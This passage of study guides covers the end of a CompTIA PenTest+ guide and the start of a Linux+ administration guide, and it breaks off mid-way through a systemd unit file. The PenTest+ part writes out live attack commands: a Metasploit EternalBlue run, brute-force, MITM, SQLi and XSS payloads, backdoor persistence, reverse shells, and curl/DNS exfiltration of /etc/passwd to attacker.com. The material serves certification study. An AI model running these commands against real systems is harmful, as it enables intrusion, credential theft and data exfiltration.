ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com"
nmap -p 389 --script ldap-rootdse 10.0.0.1
```

**Web Application:**
```bash
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
dirb http://10.0.0.1
nikto -h http://10.0.0.1        # Web vulnerability scanner
```

---

## 4. Domain 3: Vulnerability Discovery and Analysis

### Vulnerability Scanning

**Automated scanners:**
- **Nessus:** Most popular; comprehensive (free Essentials or paid)
- **OpenVAS (GVM):** Open-source alternative
- **Qualys:** Cloud-based enterprise scanner
- **Nexpose/InsightVM:** Rapid7 product
- **Burp Suite:** Web application vulnerability scanner (also manual testing)

**Scanning approaches:**
- **Credentialed scan:** Provides login credentials → deeper, more accurate
- **Non-credentialed:** External attacker view → misses internal issues
- **Agent-based:** Software on endpoint → always up-to-date

### Vulnerability Analysis

**CVE (Common Vulnerabilities and Exposures):** Unique ID for known vulnerabilities (e.g., CVE-2021-44228)

**CVSS v3 scoring (0–10):**
- **Critical:** 9.0–10.0
- **High:** 7.0–8.9
- **Medium:** 4.0–6.9
- **Low:** 0.1–3.9

**CVSS v3 metrics:**
- Attack Vector (Network/Adjacent/Local/Physical)
- Attack Complexity (Low/High)
- Privileges Required
- User Interaction
- Scope
- Confidentiality/Integrity/Availability Impact

**CPE (Common Platform Enumeration):** Standard naming for software/hardware  
**CWE (Common Weakness Enumeration):** Category of weakness type (e.g., CWE-79 = XSS)

### Common Vulnerabilities

**Unpatched systems:** Missing OS/app patches with known CVEs  
**Default credentials:** Admin:admin, admin:password on routers, cameras  
**Open services:** Unnecessary exposed ports (Telnet, FTP, RDP to internet)  
**Weak encryption:** SSL/TLS 1.0, RC4, DES, MD5  
**Misconfigurations:** Open S3 buckets, overly permissive ACLs  
**Insecure protocols:** Telnet (23), FTP (21), HTTP (80) for sensitive data

---

## 5. Domain 4: Attacks and Exploits

### Exploitation Framework: Metasploit

```bash
# Start Metasploit
msfconsole

# Search for exploits
search ms17-010              # EternalBlue
search type:exploit name:smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run / exploit

# Meterpreter (post-exploitation)
sysinfo                      # System info
getuid                       # Current user
getsystem                    # Attempt privilege escalation
ps                           # List processes
migrate 1234                 # Migrate to another process
shell                        # Drop to OS shell
upload /path/file.exe C:\\temp\\file.exe
download C:\\file.txt /local/path
hashdump                     # Dump password hashes
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester
background                   # Background the session
sessions -l                  # List sessions
sessions -i 1                # Resume session 1
```

### Password Attacks

**Online attacks (against live services):**
```bash
hydra -l admin -P wordlist.txt ssh://10.0.0.1        # SSH brute force
hydra -L users.txt -P pass.txt http-post-form 10.0.0.1 "/login:user=^USER^&pass=^PASS^:Invalid"
crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt
medusa -h 10.0.0.1 -u admin -P pass.txt -M ssh
```

**Offline attacks (against captured hashes):**
```bash
# Hashcat
hashcat -m 1000 hashes.txt wordlist.txt                   # NTLM
hashcat -m 1800 hashes.txt wordlist.txt                   # SHA-512
hashcat -m 0    hashes.txt wordlist.txt                   # MD5
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule  # With rules
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d            # Mask attack

# John the Ripper
john hashes.txt --wordlist=rockyou.txt
john --format=nt hashes.txt
john --rules hashes.txt
john --show hashes.txt      # Show cracked passwords
unshadow /etc/passwd /etc/shadow > combined.txt  # Linux
john combined.txt

# Common hash modes in Hashcat
# 0    = MD5
# 100  = SHA-1
# 1400 = SHA-256
# 1000 = NTLM (Windows)
# 1800 = sha512crypt (Linux)
# 3200 = bcrypt
# 2500 = WPA/WPA2
```

**Hash capture:**
```bash
responder -I eth0 -rdwv         # Capture NetNTLM hashes on network
impacket-ntlmrelayx -tf targets.txt  # NTLM relay
```

### Network Attacks

**ARP Poisoning / Man-in-the-Middle:**
```bash
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # Tell victim we are gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # Tell gateway we are victim
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# Then sniff traffic
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
bettercap                          # Modern framework for MITM
```

**SSL Stripping:**
```bash
sslstrip -l 8080
# Combined with ARP poisoning redirects HTTPS to HTTP
```

**DNS Spoofing:**
```bash
# Edit /etc/ettercap/etter.dns with fake records
ettercap -T -M arp:remote -P dns_spoof ...
```

**Packet Capture:**
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap 'tcp port 80'
wireshark capture.pcap
```

### Web Application Attacks

**SQL Injection:**
```bash
# Manual testing
' OR '1'='1
' OR '1'='1' --
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
'; DROP TABLE users--

# Automated with sqlmap
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" -D database --tables
sqlmap -u "http://example.com/page?id=1" -D database -T users --dump
sqlmap -u "http://example.com/login" --data="user=admin&pass=test" --dbs
sqlmap -u "http://example.com/" --cookie="session=abc" --dbs
sqlmap --os-shell        # OS shell via SQLi
```

**Cross-Site Scripting (XSS):**
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Stealing cookies -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- DOM-based XSS sources -->
document.URL, document.cookie, location.hash
```

**CSRF (Cross-Site Request Forgery):**
```html
<!-- Forge request using victim's session -->
<img src="http://bank.com/transfer?amount=1000&to=attacker">
<form method="POST" action="http://bank.com/transfer">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

**Directory Traversal / Path Traversal:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**File Inclusion:**
```
http://example.com/page?file=../../../etc/passwd    # LFI
http://example.com/page?file=http://attacker.com/shell.php  # RFI
```

**Command Injection:**
```
; cat /etc/passwd
| cat /etc/passwd
&& id
$(id)
`id`
```

**SSRF (Server-Side Request Forgery):**
```
http://169.254.169.254/latest/meta-data/          # AWS metadata
http://localhost/admin
http://internal-service/api/
```

**Burp Suite workflow:**
1. Intercept traffic with proxy (port 8080)
2. Send requests to Repeater for manual testing
3. Send to Intruder for fuzzing/brute force
4. Use Scanner for automated finding
5. Use Decoder for encode/decode
6. Use Comparer to diff responses

### Post-Exploitation

**Privilege Escalation — Linux:**
```bash
# Enumeration scripts
./linpeas.sh
./linux-exploit-suggester.sh

# SUID binaries (run as root)
find / -perm -u=s -type f 2>/dev/null
# Check GTFOBins for how to abuse SUID binaries

# Writable files and directories
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Sudo permissions
sudo -l

# Kernel exploits
uname -a
# Search CVEs for that kernel version

# Weak passwords in files
find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
cat ~/.bash_history
```

**Privilege Escalation — Windows:**
```powershell
# Enumeration scripts
.\winPEAS.exe
PowerUp.ps1

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Always Install Elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Scheduled tasks
schtasks /query /fo LIST /v

# Misconfigured services
accesschk.exe -ucqv <service> -accepteula
sc qc <service>

# DLL hijacking
# Find service with missing DLL, place malicious DLL in search path
```

**Lateral Movement:**
```bash
# Pass-the-Hash (PTH)
impacket-psexec -hashes :NTLMHASH administrator@10.0.0.5
crackmapexec smb 10.0.0.0/24 -u admin -H NTLMHASH

# Pass-the-Ticket (Kerberos)
mimikatz # sekurlsa::tickets /export
Rubeus.exe ptt /ticket:ticket.kirbi

# Remote execution
impacket-psexec administrator:password@10.0.0.5
impacket-wmiexec administrator:password@10.0.0.5
impacket-smbexec administrator:password@10.0.0.5

# PsExec (legitimate tool, commonly abused)
PsExec.exe \\10.0.0.5 -u admin -p password cmd
```

**Persistence:**
```bash
# Linux
echo "*/5 * * * * /tmp/backdoor.sh" >> /etc/crontab    # Cron job
echo "alice ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers    # Sudo
useradd -m -s /bin/bash -G sudo backdoor               # New admin user
# ~/.bashrc or ~/.profile modification

# Windows
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\backdoor.exe
schtasks /create /sc minute /mo 5 /tn "Updater" /tr C:\backdoor.exe
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

**Data Exfiltration:**
```bash
# File transfer
python3 -m http.server 8080         # Serve files on attacker
wget http://attacker.com/file       # Download on victim
curl -X POST -F file=@/etc/passwd http://attacker.com/upload

# Encode/exfil via DNS
cat /etc/passwd | xxd | cut -c10-49 | tr -d ' \n' | fold -w63 | \
  while read l; do dig ${l}.attacker.com; done

# Covert channel with ICMP
# ping with data payload
```

### Evasion Techniques

- **Encode payloads:** Base64, hex, XOR
- **Obfuscation:** Rename tools, change signatures
- **Fragmentation:** Break packets to evade IDS
- **Slow scan:** Reduce scan rate to avoid detection
- **Decoy scan:** `nmap -D RND:10 target` — fake source IPs
- **Living off the Land:** Use built-in tools (PowerShell, WMI, certutil)
- **Packed malware:** Compress/encrypt payload
- **Process injection:** Inject shellcode into legitimate process
- **Timestomping:** Change file timestamps to blend in

---

## 6. Domain 5: Reporting and Communication

### Report Structure

1. **Executive Summary**
   - High-level findings for non-technical leadership
   - Business risk, not technical details
   - Critical findings overview
   - Recommendations summary

2. **Technical Findings**
   - Each vulnerability documented with:
     - Vulnerability title and CVE/CWE
     - Severity (Critical/High/Medium/Low/Informational)
     - Affected system(s)
     - Description (what it is)
     - Evidence (screenshots, output, PoC)
     - Impact (what an attacker could do)
     - Remediation (how to fix it)

3. **Methodology**
   - Scope of engagement
   - Testing approach
   - Tools used
   - Timeline

4. **Appendices**
   - Full tool output
   - Raw scan data
   - Credentials obtained (if any)
   - Evidence screenshots

### Severity Rating

| Rating | CVSS Score | Description |
|--------|-----------|-------------|
| Critical | 9.0–10.0 | Immediate exploitation risk, full compromise |
| High | 7.0–8.9 | Significant risk, difficult to exploit |
| Medium | 4.0–6.9 | Moderate risk, some limitations |
| Low | 0.1–3.9 | Minimal risk, limited impact |
| Informational | 0 | No immediate risk, best practice |

### Communication During Testing

**Immediate notification triggers:**
- Discovered evidence of active compromise (another attacker)
- Accidental damage to systems
- Discovery of criminal activity (CSAM, fraud)
- Reaching out-of-scope systems
- Critical vulnerability that needs immediate remediation

**Written communication:** Document all actions taken with timestamps  
**Chain of custody:** Maintain evidence integrity for potential legal action

---

## 7. Domain 6: Tools and Code Analysis

### Tool Categories

**Reconnaissance:**
- theHarvester, Maltego, Recon-ng, Shodan, SpiderFoot

**Scanning:**
- Nmap, Masscan (fastest), Nessus, OpenVAS, Nikto

**Web Application:**
- Burp Suite, OWASP ZAP, sqlmap, Dirb, Gobuster, WFuzz

**Password:**
- Hashcat, John the Ripper, Hydra, Medusa, CrackMapExec

**Exploitation:**
- Metasploit, ExploitDB (searchsploit), BeEF (browser exploitation)

**Post-exploitation:**
- Mimikatz (credentials), BloodHound (AD analysis), Empire, Covenant (C2)

**Wireless:**
- Aircrack-ng suite, Kismet, Wireshark, Wifite

**Network MITM:**
- Bettercap, Ettercap, Responder

**Forensics/Analysis:**
- Wireshark, tcpdump, Volatility

### Code Analysis Basics

**Reading Python exploits:**
```python
import socket
import struct

# Buffer overflow
buffer = "A" * 2003                    # Offset to EIP
buffer += "\x8f\x35\x4a\x5f"         # JMP ESP address (little-endian)
buffer += "\x90" * 16                  # NOP sled
buffer += shellcode                    # Shellcode goes here

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.5', 9999))
s.send(buffer.encode())
s.close()
```

**Reading Bash scripts:**
```bash
#!/bin/bash
# Reverse shell
/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# One-liner alternatives
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
nc -e /bin/bash 10.0.0.1 4444
```

**Netcat listeners:**
```bash
# Catch reverse shell
nc -nlvp 4444

# Upgrade to fully interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 8. PenTest+ Key Concepts Summary

| Concept | Key Points |
|---------|-----------|
| **Authorization** | Must have written permission before any testing |
| **Scope** | Know what's in/out; stay in bounds |
| **PTES** | Pre-engagement → Intel → Threat model → Vuln → Exploit → Post-exploit → Report |
| **Kill Chain** | Recon → Weapon → Deliver → Exploit → Install → C2 → Actions |
| **CVSS** | 0–10 severity; Critical 9+, High 7+, Medium 4+, Low 0.1+ |
| **Nmap -sS** | Stealth SYN scan (default, requires root) |
| **Metasploit** | Framework: search → use → set options → run |
| **sqlmap** | Automated SQL injection testing |
| **Mimikatz** | Credential dumping from Windows memory |
| **BloodHound** | AD attack path visualization |
| **Hashcat** | Offline password cracking (-m mode) |
| **Hydra** | Online brute force (SSH, HTTP, FTP, etc.) |
| **Burp Suite** | Web app proxy/scanner/testing tool |
| **Responder** | Capture NetNTLM hashes on local network |
| **Report** | Executive summary + technical findings + evidence + remediation |

---

*End of CompTIA PenTest+ Study Guide*


---

# CompTIA Linux+ (XK0-005) — Complete Study Guide

---

## 1. Exam Overview

**Exam Code:** XK0-005  
**Questions:** Maximum 90 (multiple-choice + performance-based)  
**Time Limit:** 90 minutes  
**Passing Score:** 720 (on a 100–900 scale)  
**Recommended Experience:** CompTIA A+, Network+, and 12 months Linux admin experience

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. System Management | 32% |
| 2. Security | 21% |
| 3. Scripting, Containers, and Automation | 19% |
| 4. Troubleshooting | 28% |

---

## 2. Linux Fundamentals

### Linux Distributions

**Red Hat Family (RPM-based):**
- RHEL (Red Hat Enterprise Linux) — enterprise, paid
- CentOS Stream — community RHEL upstream
- AlmaLinux, Rocky Linux — RHEL clones (free)
- Fedora — cutting-edge, Red Hat community
- openSUSE, SLES (SUSE Linux Enterprise)

**Debian Family (DEB-based):**
- Debian — stable, community
- Ubuntu — most popular desktop/server
- Linux Mint — beginner-friendly desktop
- Kali Linux — security testing

**Other:**
- Arch Linux — rolling release, DIY
- Gentoo — compile from source
- Alpine Linux — minimal, containers

### Linux File System Hierarchy (FHS)

```
/                   Root directory — top of the tree
├── bin/            Essential user binaries (ls, cp, mv)
├── sbin/           System binaries for root (fdisk, iptables)
├── boot/           Boot loader files (vmlinuz, grub)
├── dev/            Device files (sda, tty, null, random)
├── etc/            Configuration files
│   ├── passwd      User account info
│   ├── shadow      Encrypted passwords
│   ├── group       Group info
│   ├── fstab       Filesystem mount table
│   ├── hosts       Static hostname resolution
│   ├── hostname    System hostname
│   ├── resolv.conf DNS configuration
│   ├── cron.d/     Cron job files
│   ├── ssh/        SSH configuration
│   └── sudoers     Sudo permissions
├── home/           User home directories (/home/alice)
├── lib/            Shared libraries
├── lib64/          64-bit shared libraries
├── media/          Mount point for removable media
├── mnt/            Temporary mount points
├── opt/            Optional/third-party software
├── proc/           Virtual filesystem — kernel/process info
│   ├── cpuinfo     CPU details
│   ├── meminfo     Memory info
│   ├── net/        Network statistics
│   └── PID/        Per-process directory
├── root/           Root user's home directory
├── run/            Runtime data (PID files, sockets)
├── srv/            Service data (web server files)
├── sys/            Virtual filesystem — kernel/hardware info
├── tmp/            Temporary files (cleared on reboot)
├── usr/            User utilities and applications
│   ├── bin/        Non-essential user binaries
│   ├── sbin/       Non-essential system binaries
│   ├── lib/        Libraries for /usr/bin and /usr/sbin
│   ├── local/      Locally installed software
│   └── share/      Shared data (man pages, docs)
└── var/            Variable data (logs, mail, databases)
    ├── log/        System log files
    ├── www/        Web server files
    ├── spool/      Print spooler, mail queue
    └── tmp/        Temp files preserved across reboots
```

---

## 3. Command Line Essentials

### Navigation and File Operations

```bash
# Navigation
pwd                             # Print working directory
cd /etc                         # Change to absolute path
cd ~                            # Go to home directory
cd -                            # Go to previous directory
cd ..                           # Go up one level

# Listing
ls                              # List files
ls -l                           # Long format (permissions, owner, size, date)
ls -a                           # Show hidden files (starting with .)
ls -la                          # Both
ls -lh                          # Human-readable sizes
ls -lt                          # Sort by modification time
ls -lS                          # Sort by size (largest first)
ls -R                           # Recursive
ls -d */                        # List directories only

# File operations
cp file.txt backup.txt          # Copy
cp -r dir/ backup/              # Copy directory recursively
mv file.txt /tmp/               # Move (also renames)
mv old.txt new.txt              # Rename
rm file.txt                     # Delete file
rm -rf directory/               # Delete directory recursively (DANGEROUS)
rm -i file.txt                  # Interactive — ask before delete
touch file.txt                  # Create empty file or update timestamp
mkdir directory                 # Create directory
mkdir -p /path/to/nested/dir    # Create nested dirs
rmdir directory                 # Remove empty directory
ln -s /target /link             # Create symbolic link
ln /target /link                # Create hard link

# File viewing
cat file.txt                    # Display entire file
less file.txt                   # Page through (q to quit, / to search)
more file.txt                   # Like less but less capable
head -n 20 file.txt             # First 20 lines
tail -n 20 file.txt             # Last 20 lines
tail -f /var/log/syslog         # Follow (live updates)
wc -l file.txt                  # Count lines
wc -w file.txt                  # Count words
wc -c file.txt                  # Count bytes

# Searching
find / -name "file.txt"         # Find by name
find / -type f -name "*.log"    # Find files with .log extension
find / -type d -name "config"   # Find directories
find / -size +100M              # Files larger than 100MB
find / -mtime -7                # Modified in last 7 days
find / -user alice              # Owned by alice
find / -perm -4000              # Files with SUID bit
find . -name "*.txt" -exec rm {} \;  # Execute command on results

grep "pattern" file.txt         # Search for pattern in file
grep -i "pattern" file.txt      # Case-insensitive
grep -r "pattern" /etc/         # Recursive search
grep -n "pattern" file.txt      # Show line numbers
grep -v "pattern" file.txt      # Invert (lines NOT matching)
grep -E "pattern1|pattern2"     # Extended regex (egrep)
grep -c "pattern" file.txt      # Count matching lines
grep -l "pattern" *.txt         # List files that match

locate filename                 # Fast search using database
updatedb                        # Update locate database
which command                   # Find command's location
whereis command                 # Find binary, source, man page
type command                    # What kind of thing is command
```

### Text Processing

```bash
# Sort
sort file.txt                   # Sort alphabetically
sort -n file.txt                # Numeric sort
sort -r file.txt                # Reverse sort
sort -u file.txt                # Unique (remove duplicates)
sort -k 2 file.txt              # Sort by 2nd field
sort -t: -k3 -n /etc/passwd     # Sort passwd by UID

# Cut and columns
cut -d: -f1 /etc/passwd         # Get usernames (field 1, delimiter :)
cut -c1-5 file.txt              # Characters 1-5
awk -F: '{print $1,$3}' /etc/passwd  # Print field 1 and 3
awk '{sum+=$1} END{print sum}' file  # Sum column

# sed (stream editor)
sed 's/old/new/' file.txt       # Replace first occurrence per line
sed 's/old/new/g' file.txt      # Replace all occurrences
sed 's/old/new/g' -i file.txt   # Edit file in-place
sed -n '5,10p' file.txt         # Print lines 5-10
sed '3d' file.txt               # Delete line 3
sed '/pattern/d' file.txt       # Delete lines matching pattern

# Other text utilities
tr 'a-z' 'A-Z' < file.txt      # Translate (lowercase to uppercase)
tr -d '\r' < file.txt           # Delete carriage returns
uniq file.txt                   # Remove consecutive duplicates
uniq -c file.txt                # Count duplicates
diff file1.txt file2.txt        # Compare files
comm file1.txt file2.txt        # Lines common/unique to files
paste file1.txt file2.txt       # Merge lines side by side
join file1.txt file2.txt        # Join on common field
tee output.txt                  # Write to file AND stdout
xargs                           # Build command from stdin
```

### Pipes and Redirection

```bash
# Redirection
command > output.txt            # Redirect stdout (overwrite)
command >> output.txt           # Append stdout
command 2> error.txt            # Redirect stderr
command 2>&1                    # Redirect stderr to stdout
command &> all.txt              # Redirect both stdout and stderr
command > /dev/null 2>&1        # Discard all output
command < input.txt             # Redirect stdin from file

# Pipes
command1 | command2             # Pipe stdout to stdin
ls -la | grep ".txt"            # List .txt files
cat /etc/passwd | cut -d: -f1 | sort    # Pipeline
ps aux | grep nginx | grep -v grep

# File descriptors
# 0 = stdin, 1 = stdout, 2 = stderr

# Here document
cat << EOF > file.txt
Line 1
Line 2
EOF

# Process substitution
diff <(sort file1.txt) <(sort file2.txt)
```

---

## 4. User and Group Management

```bash
# User management
useradd alice                   # Create user (minimal setup)
useradd -m -s /bin/bash -c "Alice Smith" -G sudo alice   # Full creation
useradd -u 1500 alice           # Set specific UID
userdel alice                   # Delete user (keep home)
userdel -r alice                # Delete user and home directory
usermod -aG sudo alice          # Add to group (keep existing groups)
usermod -G wheel alice          # Set groups (REPLACES existing)
usermod -s /bin/zsh alice       # Change shell
usermod -l newname alice        # Rename user
usermod -L alice                # Lock account
usermod -U alice                # Unlock account
usermod -e 2024-12-31 alice     # Set expiry date
usermod -d /home/newdir alice   # Change home directory

# Password management
passwd alice                    # Set/change password
passwd -l alice                 # Lock account
passwd -u alice                 # Unlock account
passwd -e alice                 # Force change on next login
chage -l alice                  # List password aging info
chage -M 90 alice               # Set max password age (90 days)
chage -m 7 alice                # Minimum days between changes
chage -E 2024-12-31 alice       # Set expiry date
chage -W 14 alice               # Warning 14 days before expiry

# Group management
groupadd developers             # Create group
groupdel developers             # Delete group
groupmod -n devteam developers  # Rename group
groups alice                    # Show alice's groups
id alice                        # UID, GID, all groups
newgrp developers               # Switch primary group (current session)

# Important files
/etc/passwd     # Username:x:UID:GID:GECOS:home:shell
/etc/shadow     # Username:hash:last_change:min:max:warn:inactive:expire
/etc/group      # Groupname:x:GID:member1,member2
/etc/gshadow    # Secure group file
/etc/default/useradd  # Default useradd settings
/etc/login.defs # Password aging and account defaults
/etc/skel/      # Template files copied to new home directories

# Switching users
su - alice                      # Switch to alice (full login shell)
su alice                        # Switch (no new environment)
sudo command                    # Run command as root
sudo -u alice command           # Run as alice
sudo -i                         # Root shell
sudo -s                         # Root shell (keep environment)
sudo -l                         # List sudo permissions

# sudoers file
visudo                          # Edit sudoers (validates syntax)
# Format: user/group host=(runas) commands
alice  ALL=(ALL:ALL) ALL        # Full sudo access
%wheel ALL=(ALL) NOPASSWD: ALL  # Group wheel, no password
alice  ALL=(ALL) /bin/systemctl restart nginx   # Specific command
```

---

## 5. Permissions

### Standard Unix Permissions

```bash
# View permissions
ls -l
# -rwxr-xr-- 1 alice devs 4096 Jan 15 10:30 script.sh
#  ^^^^^^^^^^   ^^^^^ ^^^^
#  permissions  user  group

# Permission bits
# r = read    (4)
# w = write   (2)
# x = execute (1)
# - = none    (0)

# Three groups: owner | group | others
# rwxr-xr-- = 7(owner) 5(group) 4(others) = 754

# Change permissions
chmod 755 script.sh             # Numeric (rwxr-xr-x)
chmod 644 file.txt              # Numeric (rw-r--r--)
chmod u+x script.sh             # Add execute to owner
chmod g-w file.txt              # Remove write from group
chmod o=r file.txt              # Set others to read only
chmod a+r file.txt              # Add read to all
chmod u=rwx,g=rx,o= file.sh    # Set exactly

# Recursive
chmod -R 755 directory/
chmod -R u+rwX directory/       # Capital X = execute only on dirs

# Change owner and group
chown alice file.txt
chown alice:devs file.txt
chown :devs file.txt            # Change group only
chgrp devs file.txt             # Change group
chown -R alice:devs directory/  # Recursive

# Common permission sets
# 777 rwxrwxrwx — avoid! (unsafe)
# 755 rwxr-xr-x — executable/directory
# 644 rw-r--r-- — regular file
# 600 rw------- — private file
# 700 rwx------ — private executable/directory
```

### Special Permission Bits

```bash
# SUID (Set User ID) — bit 4
# File executes with owner's permissions, not caller's
chmod u+s /usr/bin/passwd       # passwd needs root to write /etc/shadow
chmod 4755 program              # 4 = SUID
ls -l /usr/bin/passwd           # Shows: -rwsr-xr-x (s in owner execute)
find / -perm -4000 -type f      # Find SUID files

# SGID (Set Group ID) — bit 2
# File executes with group's permissions
# On directory: new files inherit directory's group
chmod g+s directory/
chmod 2755 directory/
ls -l directory/                # Shows: drwxr-sr-x (s in group execute)

# Sticky bit — bit 1
# On directory: only owner can delete their own files
chmod +t /tmp
chmod 1777 /tmp
ls -l /                         # Shows: drwxrwxrwt for /tmp (t in others)

# Numeric special bits: SUID=4, SGID=2, Sticky=1
chmod 4755 file     # SUID
chmod 2755 dir      # SGID
chmod 1777 dir      # Sticky
chmod 6755 file     # SUID + SGID
```

### File Attributes

```bash
chattr +i file.txt              # Immutable (even root can't delete)
chattr +a file.txt              # Append-only
chattr -i file.txt              # Remove immutable
lsattr file.txt                 # List attributes
```

### Access Control Lists (ACL)

```bash
getfacl file.txt                # View ACL
setfacl -m u:alice:rw file.txt  # Give alice read-write
setfacl -m g:devs:r file.txt    # Give devs group read
setfacl -x u:alice file.txt     # Remove ACL for alice
setfacl -b file.txt             # Remove all ACLs
setfacl -m d:u:alice:rw dir/    # Default ACL for new files in dir
```

---

## 6. Package Management

### Red Hat / RHEL / Fedora (RPM)

```bash
# DNF (modern, Fedora/RHEL 8+)
dnf install nginx               # Install
dnf remove nginx                # Remove
dnf update                      # Update all packages
dnf upgrade nginx               # Upgrade specific package
dnf search nginx                # Search
dnf info nginx                  # Package info
dnf list installed              # List installed
dnf list available              # List available
dnf check-update                # Check for updates
dnf repolist                    # List repositories
dnf history                     # Transaction history
dnf autoremove                  # Remove unused dependencies
dnf clean all                   # Clean cache

# YUM (older, RHEL 7)
yum install nginx
yum remove nginx
yum update
yum search nginx

# RPM (low-level)
rpm -ivh package.rpm            # Install with verbose + hash
rpm -Uvh package.rpm            # Upgrade
rpm -evh package                # Erase (uninstall)
rpm -qa                         # Query all installed
rpm -qi nginx                   # Query info
rpm -ql nginx                   # List files in package
rpm -qf /etc/nginx/nginx.conf   # Find which package owns file
rpm -qR nginx                   # List dependencies
rpm --verify nginx               # Verify package integrity
rpm -K package.rpm              # Check signature
```

### Debian / Ubuntu (APT)

```bash
# APT (high-level)
apt update                      # Update package list
apt upgrade                     # Upgrade all packages
apt install nginx               # Install
apt remove nginx                # Remove (keep config)
apt purge nginx                 # Remove + config files
apt autoremove                  # Remove unused dependencies
apt search nginx                # Search
apt show nginx                  # Package info
apt list --installed            # List installed
apt list --upgradable           # List upgradable

# DPKG (low-level)
dpkg -i package.deb             # Install
dpkg -r nginx                   # Remove
dpkg -P nginx                   # Purge
dpkg -l                         # List all installed
dpkg -l nginx                   # Info about nginx
dpkg -L nginx                   # List files installed by nginx
dpkg -S /etc/nginx/nginx.conf   # Find package owning file
dpkg -c package.deb             # Contents of .deb file
dpkg --verify nginx             # Verify

# Add repository
add-apt-repository ppa:user/repo
# Manual repo:
echo "deb http://repo.example.com/debian stable main" > /etc/apt/sources.list.d/example.list
apt-key add key.gpg
```

---

## 7. Process Management

```bash
# View processes
ps                              # Current shell's processes
ps aux                          # All processes, all users
ps aux | grep nginx
ps -ef                          # Full format
ps -ejH                         # Process tree
pstree                          # Tree view

# top and htop
top                             # Interactive process viewer
# Keys in top: k (kill), r (renice), q (quit), M (sort by memory)
htop                            # Enhanced top (install separately)

# Process signals
kill PID                        # Send SIGTERM (graceful)
kill -9 PID                     # Send SIGKILL (force)
kill -15 PID                    # Send SIGTERM explicitly
kill -HUP PID                   # SIGHUP — reload config
killall nginx                   # Kill all nginx processes by name
pkill nginx                     # Kill by name pattern
pkill -u alice                  # Kill all processes by user

# Common signals
# 1  SIGHUP  — Hangup / reload config
# 2  SIGINT  — Interrupt (Ctrl+C)
# 9  SIGKILL — Kill immediately (cannot be caught)
# 15 SIGTERM — Terminate gracefully (default for kill)
# 18 SIGCONT — Continue
# 19 SIGSTOP — Stop (cannot be caught)

# Background and foreground
command &                       # Run in background
Ctrl+Z                          # Suspend current process
jobs                            # List background/suspended jobs
bg                              # Resume suspended in background
fg                              # Bring background to foreground
fg %2                           # Bring job 2 to foreground
disown %1                       # Remove from shell's job list (survive logout)
nohup command &                 # Run even after logout (output to nohup.out)

# Priority
nice -n 10 command              # Start with lower priority (10, range -20 to 19)
nice -n -10 command             # Higher priority (needs root)
renice 10 -p PID                # Change priority of running process

# Viewing resource usage
top                             # Real-time
free -h                         # Memory usage
vmstat 1                        # Virtual memory stats every 1 second
iostat 1                        # I/O statistics
lsof                            # List open files
lsof -p PID                     # Open files for specific process
lsof -u alice                   # Open files for user
lsof -i :80                     # Processes using port 80
```

---

## 8. Systemd and Services

```bash
# Service management
systemctl start nginx           # Start service
systemctl stop nginx            # Stop service
systemctl restart nginx         # Restart
systemctl reload nginx          # Reload config (no downtime)
systemctl enable nginx          # Enable at boot
systemctl disable nginx         # Disable at boot
systemctl enable --now nginx    # Enable AND start immediately
systemctl status nginx          # Check status
systemctl is-active nginx       # Is it running?
systemctl is-enabled nginx      # Is it enabled at boot?

# System control
systemctl list-units            # List active units
systemctl list-units --type=service
systemctl list-unit-files       # All installed unit files
systemctl daemon-reload         # Reload systemd after unit file change
systemctl reboot
systemctl poweroff
systemctl halt

# Journal (logs)
journalctl                      # All logs
journalctl -u nginx             # Logs for nginx service
journalctl -f                   # Follow (like tail -f)
journalctl -n 50                # Last 50 lines
journalctl --since "1 hour ago"
journalctl --since "2024-01-15 10:00:00"
journalctl -b                   # Current boot
journalctl -b -1                # Previous boot
journalctl -p err               # Only error and above
journalctl -p err..crit         # Range of priorities

# Creating a systemd service unit
# /etc/systemd/system/myapp.service
cat << 'EOF' > /etc/systemd/system/myapp.service
[Unit]
Description=My Application
After=network.target

[Service]
Type=simple
User=appuser
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/start.sh
ExecStop=/opt/myapp/stop.sh
Restart=on-failure
RestartSec=5

[Install]
